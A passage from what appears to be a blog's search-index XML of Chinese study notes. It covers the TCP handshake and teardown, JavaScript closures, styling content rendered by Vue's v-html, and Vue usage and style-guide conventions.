        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcp三次握手、四次挥手</title>
      <link href="/furtherNotes/further/02%20tcp%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B"/>
      <url>/furtherNotes/further/02%20tcp%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：</p><p><a href="https://juejin.cn/post/6844904070889603085#heading-1">https://juejin.cn/post/6844904070889603085#heading-1</a></p><p><a href="https://juejin.cn/post/6844903625513238541">https://juejin.cn/post/6844903625513238541</a></p></blockquote><h2 id="三次握手">三次握手<a title="#三次握手" href="#三次握手"></a></h2><h4 id="为什么要进行三次握手：为了确认对方的发送和接收能力。">为什么要进行三次握手：为了确认对方的发送和接收能力。<a title="#为什么要进行三次握手：为了确认对方的发送和接收能力。" href="#为什么要进行三次握手：为了确认对方的发送和接收能力。"></a></h4><h4 id="主要流程：">主要流程：<a title="#主要流程：" href="#主要流程："></a></h4><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2018/6/26/1643a1dd6df4813b~tplv-t2oaga2asx-zoom-in-crop-mark:1304:0:0:0.awebp" style="zoom: 40%;float:flet;" >  <h4 id="为什么不是两次？">为什么不是两次？<a title="#为什么不是两次？" href="#为什么不是两次？"></a></h4><p>根本原因: 无法确认客户端的接收能力。</p><p>如果是两次，你现在发了 SYN 报文想握手，但是这个包<strong>滞留</strong>在了当前的网络中迟迟没有到达，TCP 以为这是丢了包，于是重传，两次握手建立好了连接。</p><p>看似没有问题，但是连接关闭后，如果这个<strong>滞留</strong>在网路中的包到达了服务端呢？这时候由于是两次握手，服务端只要接收到然后发送相应的数据包，就默认<strong>建立连接</strong>，但是现在客户端已经断开了。</p><h4 id="为什么不是四次？">为什么不是四次？<a title="#为什么不是四次？" href="#为什么不是四次？"></a></h4><p>三次握手的目的是确认双方<code>发送</code>和<code>接收</code>的能力，那四次握手可以嘛？</p><p>当然可以，100 次都可以。但为了解决问题，三次就足够了，再多用处就不大了。</p><h4 id="三次握手过程中可以携带数据么？">三次握手过程中可以携带数据么？<a title="#三次握手过程中可以携带数据么？" href="#三次握手过程中可以携带数据么？"></a></h4><p>第三次握手的时候，可以携带。前两次握手不能携带数据。</p><p>如果前两次握手能够携带数据，<strong>那么一旦有人想攻击服务器，那么他只需要在第一次握手中的 SYN 报文中放大量数据，那么服务器势必会消耗更多的时间和内存空间去处理这些数据</strong>，增大了服务器被攻击的风险。</p><p>第三次握手的时候，客户端已经处于<code>ESTABLISHED</code>状态，并且已经能够确认服务器的接收、发送能力正常，这个时候相对安全了，可以携带数据。</p><h4 id="同时打开会怎样？">同时打开会怎样？<a title="#同时打开会怎样？" href="#同时打开会怎样？"></a></h4><p>如果双方同时发 <code>SYN</code>报文，状态变化会是怎样的呢？</p><p>在发送方给接收方发<code>SYN</code>报文的同时，接收方也给发送方发<code>SYN</code>报文，两个人刚上了!</p><p>发完<code>SYN</code>，两者的状态都变为<code>SYN-SENT</code>。</p><p>在各自收到对方的<code>SYN</code>后，两者状态都变为<code>SYN-REVD</code>。</p><p>接着会回复对应的<code>ACK + SYN</code>，这个报文在对方接收之后，两者状态一起变为<code>ESTABLISHED</code>。</p><p>这就是同时打开情况下的状态变迁。</p><h2 id="四次挥手">四次挥手<a title="#四次挥手" href="#四次挥手"></a></h2><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2018/6/26/1643a20296de1ff0~tplv-t2oaga2asx-zoom-in-crop-mark:1304:0:0:0.awebp" style="zoom:40%;" ><h4 id="等待2msl的意义">等待2MSL的意义<a title="#等待2msl的意义" href="#等待2msl的意义"></a></h4><p>如果不等待，客户端直接跑路，当<strong>服务端还有很多数据包要给客户端发</strong>，且还在路上的时候，若客户端的端口此时刚好被新的应用占用，那么就接收到了无用数据包，造成数据包混乱。所以，<strong>最保险的做法是等服务器发来的数据包都死翘翘再启动新的应用。</strong></p><ul><li>1 个 MSL 确保四次挥手中<strong>主动关闭方最后的 ACK 报文最终能达到对端</strong></li><li>1 个 MSL 确保<strong>对端没有收到 ACK 重传的 FIN 报文可以到达</strong></li></ul><p>这就是等待 2MSL 的意义。</p><h4 id="为什么是四次挥手而不是三次？">为什么是四次挥手而不是三次？<a title="#为什么是四次挥手而不是三次？" href="#为什么是四次挥手而不是三次？"></a></h4><p>因为服务端在接收到<code>FIN</code>, 往往不会立即返回<code>FIN</code>, <strong>必须等到服务端所有的报文都发送完毕了，才能发<code>FIN</code></strong>。因此先发一个<code>ACK</code>表示已经收到客户端的<code>FIN</code>，延迟一段时间才发<code>FIN</code>。这就造成了四次挥手。</p><p>如果是三次挥手会有什么问题？</p><p>等于<strong>说服务端将<code>ACK</code>和<code>FIN</code>的发送合并为一次挥手</strong>，这个时候<strong>长时间的延迟</strong>可能会导致客户端误以为<code>FIN</code>没有到达客户端，从而让客户端不断的重发<code>FIN</code></p><h4 id="同时关闭会怎样？">同时关闭会怎样？<a title="#同时关闭会怎样？" href="#同时关闭会怎样？"></a></h4><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/2/23/170723edeb9e8003~tplv-t2oaga2asx-zoom-in-crop-mark:1304:0:0:0.awebp" style="zoom:67%;" >]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅浅了解闭包</title>
      <link href="/workNotes/work/09%20%E9%97%AD%E5%8C%85"/>
      <url>/workNotes/work/09%20%E9%97%AD%E5%8C%85</url>
      
        <content type="html"><![CDATA[<blockquote><p>2022.03.02 周三</p><p>参考链接：<a href="https://github.com/lgwebdream/FE-Interview/issues/17">https://github.com/lgwebdream/FE-Interview/issues/17</a></p></blockquote><h2 id="对闭包的看法，为什么要用闭包？说一下闭包原理以及应用场景">对闭包的看法，为什么要用闭包？说一下闭包原理以及应用场景<a title="#对闭包的看法，为什么要用闭包？说一下闭包原理以及应用场景" href="#对闭包的看法，为什么要用闭包？说一下闭包原理以及应用场景"></a></h2><h3 id="闭包是什么？">闭包是什么？<a title="#闭包是什么？" href="#闭包是什么？"></a></h3><p>函数执行后返回结果是一个内部函数，并被外部变量所引用，如果内部函数持有被执行函数作用域的变量，就形成了闭包。</p><blockquote><p>简而言之：可以在内部函数访问到外部函数的作用域。</p></blockquote><p>使用闭包的作用：</p><ol><li>读取函数中的变量</li><li>将函数中的变量存储在内存中，保护变量不被污染。<blockquote><p>因此，会对内存有消耗，所以不可以滥用闭包，否则会影响网页性能，造成内存泄漏。<br>在不需要使用闭包时，要及时释放内存，可以将内层函数对象的变量赋值为 null</p></blockquote></li></ol><h3 id="闭包原理">闭包原理<a title="#闭包原理" href="#闭包原理"></a></h3><p>函数执行分成两个阶段：预编译阶段 和 执行阶段</p><ol><li>预编译阶段，如果发现内部函数使用了外部函数的变量，则会在内存中创建一个“闭包”对象并保存对应变量，如果已存在“闭包”，就只需要增加对应的属性值即可。</li><li>执行完后，函数执行上下文会被销毁，函数对“闭包”对象的引用也会被销毁，但内部函数还持有该“闭包”的引用，所以内部函数可以继续使用外部函数中的变量</li></ol><blockquote><p>利用函数作用域链的特性，一个函数<strong>内部定义的函数</strong> 会将包含的 <strong>外部函数的活动对象</strong> 添加到它的作用域中，函数执行完毕，其函数执行作用域链销毁；但因为 <strong>内部函数的作用域链</strong> 仍然<strong>在引用</strong>这个活动对象，所以其活动对象不会被销毁，直至内部函数被销毁后才被销毁。</p></blockquote><h3 id="优点">优点<a title="#优点" href="#优点"></a></h3><ul><li>可以从内部函数访问外部函数的作用域中的变量，且访问到的变量长期存储在内存中，可供后面使用</li><li>避免变量污染全局</li><li>把变量存在独立的作用域，作为私有成员存在</li></ul><h3 id="缺点">缺点<a title="#缺点" href="#缺点"></a></h3><ul><li>对内存消耗有负面影响，因内部函数保存了对外部变量的引用，导致无法被垃圾回收，增大内存使用量，所以使用不当会导致内存泄漏。</li><li>对处理速度具有负面影响。闭包的层级决定了引用的外部变量在查找时经过的作用域链的长度</li><li>可能获取到意外的值 captured value</li></ul><h3 id="应用场景">应用场景<a title="#应用场景" href="#应用场景"></a></h3><ol><li>模块封装；在各模块规范出现之前，都是用这样的方式防止变量污染全局</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bar = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> foo = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  bar.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">ddd</span> = <span class="keyword">function</span> <span class="title function_">ddd</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> foo;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> bar;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="2"><li>在循环中创建闭包，防止取到意外的值</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">num</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(num);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span> ; i &lt; <span class="number">3</span> ; i++&gt;)&#123;</span><br><span class="line">  <span class="title function_">foo</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 闭包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于 v-html 内样式不生效</title>
      <link href="/workNotes/work/07%20v-html%20%E6%A0%B7%E5%BC%8F%E4%B8%8D%E7%94%9F%E6%95%88"/>
      <url>/workNotes/work/07%20v-html%20%E6%A0%B7%E5%BC%8F%E4%B8%8D%E7%94%9F%E6%95%88</url>
      
        <content type="html"><![CDATA[<blockquote><p>free-vpn 读取$t 里面的内容 作为 html 其中有个 a 标签有其他样式<br>参考链接 <a href="https://cloud.tencent.com/developer/article/1485232">https://cloud.tencent.com/developer/article/1485232</a></p></blockquote><p>关于 v-html</p><blockquote><p>在 vue 使用中，指令 v-html 渲染页面经常用到，类似于 jQuery 的$(‘x’).html( )去渲染。通过指令 v-html 渲染出来的内容还会带有原来的标签及其样式，如果需要修改或者重设其样式，应该如何去做呢？</p></blockquote><ul><li><p>采坑<br>   首先，我在 style 中用子级选择器去选中并修改样式，经过猛如虎的操作后，并没生效。F12 打开 Elements 调试，发现在 style 里面样式根本没加载上去，没有 class 中也没有类名出现。除此之外，渲染非该指令元素时，所有的类名会跟有 [data-v-xxxxxx]的东西。</p></li><li><p>排坑</p><ul><li>去掉 style 中的 scoped;</li><li>watch 监测数据变化;</li><li>深度选择器 &gt;&gt;&gt;</li></ul></li></ul><ol><li>在 vue 组件中，我们写 style 时，为了防止页面样式冲突，在每个组件中会加上 scoped 属性。经测试，去掉该属性即可渲染样式成功。但是在组件过多或者项目中大时，经常会出现页面样式冲突，因此该方法不建议使用。</li><li>在 script&gt;exportdefault 中,watch 属性可监听 v-html 所绑定值的变化。如果是后台请求的数据，那么可以在 watch 中监听改数据变化，当数据发生改变驱动视图后，动态绑定一个 class 来改变子级元素样式。此方法有一定局限性。</li><li>深度选择器 &gt;&gt;&gt;，可深度改变子级样式</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.test</span> &gt;&gt;&gt; * &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 如果使用 scss或者 less等css扩展语言，则用 /deep/替代 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span> <span class="attr">type</span>=<span class="string">&quot;text/scss&quot;</span> <span class="attr">lang</span>=<span class="string">&quot;scss&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.test</span> &#123;</span></span><br><span class="line"><span class="language-css">    /deep/ * &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>scoped 属性导致 css 仅对当前组件生效，而 html 绑定渲染出的内容可以理解为是子组件的内容，一般情况下子组件不会被加上对应的属性，所以不会应用带有 scoped 的 css。</p>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue 一些注意的问题</title>
      <link href="/workNotes/work/06%20vue%20%E9%97%AE%E9%A2%98"/>
      <url>/workNotes/work/06%20vue%20%E9%97%AE%E9%A2%98</url>
      
        <content type="html"><![CDATA[<h1 id="vue-一些注意的问题">vue 一些注意的问题<a title="#vue-一些注意的问题" href="#vue-一些注意的问题"></a></h1><blockquote><p>参考 官方文档</p></blockquote><ol><li><p>v-if 与 v-show<br>v-if 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。</p><p>v-if 也是惰性的：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。</p><p>相比之下，v-show 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。</p><p>一般来说，<strong>v-if 有更高的切换开销，而 v-show 有更高的初始渲染开</strong>销。因此，如果需要非常频繁地切换，则使用 v-show 较好；如果在运行时条件很少改变，则使用 v-if 较好。</p></li><li><p>避免 v-if 与 v-for 一起使用<br>v-for 优先级比 v-if 高，多了不必要的开销</p></li><li><p>v-for 中的 in 可以被 of 替代，它更接近 JavaScript 迭代器的语法；<br>v-for 中的参数依次为(item, keyname, value);<br>不要使用对象或数组之类的非基本类型值作为 v-for 的 key。请用字符串或数值类型的值。</p></li><li><p>数组更新检测<br>Vue 将被侦听的数组的变更方法进行了包裹，所以它们也将会触发视图更新。这些被包裹过的方法包括：<br><code>push() pop() shift() unshift() splice() sort() reverse()</code></p></li><li><p>@click=“handle($event)” 在内联语句处理器中访问原始的 DOM 事件</p></li><li><p>v-model</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">&quot;searchText&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 等价于 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-bind:value</span>=<span class="string">&quot;searchText&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:input</span>=<span class="string">&quot;searchText = $event.target.value&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure><pre><code>v-model 在内部为不同的输入元素使用不同的 property 并抛出不同的事件：+ text 和 textarea 元素使用 value property 和 input 事件；+ checkbox 和 radio 使用 checked property 和 change 事件；+ select 字段将 value 作为 prop 并将 change 作为事件。</code></pre><ol start="7"><li><p>一个组件的data必须是 函数<br>一个组件的 data 选项必须是一个函数，因此每个实例可以维护一份被返回对象的独立的拷贝</p></li><li><p>注册组件</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全局注册</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;component-a&#x27;</span>, &#123; <span class="comment">/* ... */</span> &#125;)</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;component-b&#x27;</span>, &#123; <span class="comment">/* ... */</span> &#125;)</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;component-c&#x27;</span>, &#123; <span class="comment">/* ... */</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123; <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 局部注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">ComponentA</span> = &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">ComponentB</span> = &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">ComponentC</span> = &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="attr">components</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;component-a&#x27;</span>: <span class="title class_">ComponentA</span>,</span><br><span class="line">    <span class="string">&#x27;component-b&#x27;</span>: <span class="title class_">ComponentB</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol start="9"><li><p>prop 的写法<br>在js中:<code>props:[postTitle]</code>;<br>在html中:<code>&lt;blog-post post-title=&quot;hello!&quot;&gt;&lt;/blog-post&gt;</code></p></li><li><p>prop 可以通过 v-bind 动态赋值</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog-post</span> <span class="attr">v-bind:title</span>=<span class="string">&quot;post.title&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">blog-post</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="11"><li><p>单项数据流<br>所有的 prop 都使得其父子 prop 之间形成了一个单向下行绑定：父级 prop 的更新会向下流动到子组件中，但是反过来则不行。这样会防止从子组件意外变更父级组件的状态，从而导致你的应用的数据流向难以理解。</p><p>额外的，每次父级组件发生变更时，子组件中所有的 prop 都将会刷新为最新的值。这意味着你不应该在一个子组件内部改变 prop。如果你这样做了，Vue 会在浏览器的控制台中发出警告。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue风格指南</title>
      <link href="/workNotes/work/05%20vue%20%E9%A3%8E%E6%A0%BC%E6%8C%87%E5%8D%97"/>
      <url>/workNotes/work/05%20vue%20%E9%A3%8E%E6%A0%BC%E6%8C%87%E5%8D%97</url>
      
        <content type="html"><![CDATA[<h2 id="优先级a">优先级A<a title="#优先级a" href="#优先级a"></a></h2><h3 id="组件名为多个单词">组件名为多个单词<a title="#组件名为多个单词" href="#组件名为多个单词"></a></h3><p>这样做可以避免跟现有的以及未来的 HTML 元素相冲突，因为所有的 HTML 元素名称都是单个单词的。</p><h3 id="组件数据必为函数">组件数据必为函数<a title="#组件数据必为函数" href="#组件数据必为函数"></a></h3><p>当在组件中使用 data property 的时候 (除了 new Vue 外的任何地方)，它的值必须是返回一个对象的函数。</p><blockquote><p>当 data 的值是一个对象时，它会在这个组件的所有实例之间共享。当组件被重用时，因为每个组件的实例都引用了相同的数据对象，更改其中一个对象就是改变到其他使用到该组件的数据</p></blockquote><p>我们希望每个组件实例都管理其自己的数据。为了做到这一点，每个实例必须生成一个独立的数据对象。在 JavaScript 中，在一个函数中返回这个对象就可以了。</p><h3 id="prop-定义应该尽量详细">prop 定义应该尽量详细<a title="#prop-定义应该尽量详细" href="#prop-定义应该尽量详细"></a></h3><p>至少要指定数据类型</p><blockquote><p>细致的 prop 定义有两个好处：</p><p>它们写明了组件的 API，所以很容易看懂组件的用法；</p><p>在开发环境下，如果向一个组件提供格式不正确的 prop，Vue 将会告警，以帮助你捕获潜在的错误来源。</p></blockquote><h3 id="v-for-设置-key">v-for 设置 key<a title="#v-for-设置-key" href="#v-for-设置-key"></a></h3><p>以便维护内部组件及其子树的状态。</p><h3 id="避免-v-if-和-v-for-一起使用">避免 v-if 和 v-for 一起使用<a title="#避免-v-if-和-v-for-一起使用" href="#避免-v-if-和-v-for-一起使用"></a></h3><p>当 Vue 处理指令时，v-for 比 v-if 具有更高的优先级。<br>所以当用在一个元素的时候，会先把所有元素遍历渲染出来，在看v-if哪些是不用渲染的</p><h3 id="为组件样式设置作用域">为组件样式设置作用域<a title="#为组件样式设置作用域" href="#为组件样式设置作用域"></a></h3><p>顶级 App 组件和布局组件中的样式可以是全局的，但是其它所有组件都应该是有作用域的</p><blockquote><p>这条规则只和单文件组件有关。你不一定要使用 scoped attribute。设置作用域也可以通过 CSS Modules，那是一个基于 class 的类似 BEM 的策略，当然你也可以使用其它的库或约定。</p><p>不管怎样，对于组件库，我们应该更倾向于选用基于 class 的策略而不是 scoped attribute。</p><p>这让覆写内部样式更容易：使用了常人可理解的 class 名称且没有太高的选择器优先级，而且不太会导致冲突。</p></blockquote><p>Vue 使用 _ 前缀来定义其自身的私有 property，所以使用相同的前缀 (比如 <em>update) 有覆写实例 property 的风险。即便你检查确认 Vue 当前版本没有用到这个 property 名，也不能保证和将来的版本没有冲突。<br>对于 $ 前缀来说，其在 Vue 生态系统中的目的是暴露给用户的一个特殊的实例 property，所以把它用于私有 property 并不合适。<br>不过，我们推荐把这两个前缀结合为 $</em>，作为一个用户定义的私有 property 的约定，以确保不会和 Vue 自身相冲突。</p><h2 id="优先级b">优先级B<a title="#优先级b" href="#优先级b"></a></h2><h3 id="组件文件">组件文件<a title="#组件文件" href="#组件文件"></a></h3><h3 id="单文件组件文件名称">单文件组件文件名称<a title="#单文件组件文件名称" href="#单文件组件文件名称"></a></h3><p>单文件组件的文件名应该要么始终是单词大写开头 (PascalCase)，要么始终是横线连接 (kebab-case)。</p><blockquote><p>单词大写开头对于代码编辑器的自动补全最为友好，因为这使得我们在 JS(X) 和模板中引用组件的方式尽可能的一致。然而，混用文件命名方式有的时候会导致大小写不敏感的文件系统的问题，这也是横线连接命名同样完全可取的原因。</p></blockquote><h3 id="基础组件名">基础组件名<a title="#基础组件名" href="#基础组件名"></a></h3><p>应用特定样式和约定的基础组件 (也就是展示类的、无逻辑的或无状态的组件) 应该全部以一个特定的前缀开头，比如 Base、App 或 V</p><h3 id="单例组件名-the">单例组件名 The<a title="#单例组件名-the" href="#单例组件名-the"></a></h3><p>只应该拥有单个活跃实例的组件应该以 The 前缀命名，以示其唯一性</p><p>这不意味着组件只可用于一个单页面，而是每个页面只使用一次。这些组件永远不接受任何 prop，因为它们是为你的应用定制的，而不是它们在你的应用中的上下文。如果你发现有必要添加 prop，那就表明这实际上是一个可复用的组件，只是目前在每个页面里只使用一次。</p><h3 id="紧密耦合的组件名">紧密耦合的组件名<a title="#紧密耦合的组件名" href="#紧密耦合的组件名"></a></h3><p>和父组件紧密耦合的子组件应该以父组件名作为前缀命名</p><h3 id="自闭合组件">自闭合组件<a title="#自闭合组件" href="#自闭合组件"></a></h3><p>组件名中的单词顺序在单文件组件、字符串模板和 JSX 中没有内容的组件应该是自闭合的——但在 DOM 模板里永远不要这样做。</p><p>自闭合组件表示它们不仅没有内容，而且刻意没有内容。其不同之处就好像书上的一页白纸对比贴有“本页有意留白”标签的白纸。而且没有了额外的闭合标签，你的代码也更简洁。</p><p>不幸的是，HTML 并不支持自闭合的自定义元素——只有官方的“空”元素。所以上述策略仅适用于进入 DOM 之前 Vue 的模板编译器能够触达的地方，然后再产出符合 DOM 规范的 HTML。<br>组件名应该以高级别的 (通常是一般化描述的) 单词开头，以描述性的修饰词结尾。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在单文件组件、字符串模板和 JSX 中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">MyComponent</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 在 DOM 模板中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">my-component</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="模版中的组件名大小写">模版中的组件名大小写<a title="#模版中的组件名大小写" href="#模版中的组件名大小写"></a></h3><p>对于绝大多数项目来说，在单文件组件和字符串模板中组件名应该总是 PascalCase 的——但是在 DOM 模板中总是 kebab-case 的。</p><blockquote><p>PascalCase 相比 kebab-case 有一些优势：</p></blockquote><blockquote><p>编辑器可以在模板里自动补全组件名，因为 PascalCase 同样适用于 JavaScript。<br><code>&lt;MyComponent&gt;</code> 视觉上比 <code>&lt;my-component&gt;</code> 更能够和单个单词的 HTML 元素区别开来，因为前者的不同之处有两个大写字母，后者只有一个横线。<br>如果你在模板中使用任何非 Vue 的自定义元素，比如一个 Web Component，PascalCase 确保了你的 Vue 组件在视觉上仍然是易识别的。<br>不幸的是，由于 HTML 是大小写不敏感的，在 DOM 模板中必须仍使用 kebab-case。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在单文件组件和字符串模板中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">MyComponent</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 在 DOM 模板中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">my-component</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- or 在所有地方 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">my-component</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="js/jsx-中组件名大小写">js/jsx 中组件名大小写<a title="#js/jsx-中组件名大小写" href="#js/jsx-中组件名大小写"></a></h3><p>JS/JSX 中的组件名应该始终是 PascalCase 的，尽管在较为简单的应用中只使用 Vue.component 进行全局组件注册时，可以使用 kebab-case 字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;MyComponent&#x27;</span>, &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;my-component&#x27;</span>, &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">MyComponent</span> <span class="keyword">from</span> <span class="string">&#x27;./MyComponent.vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;MyComponent&#x27;</span>,</span><br><span class="line">  <span 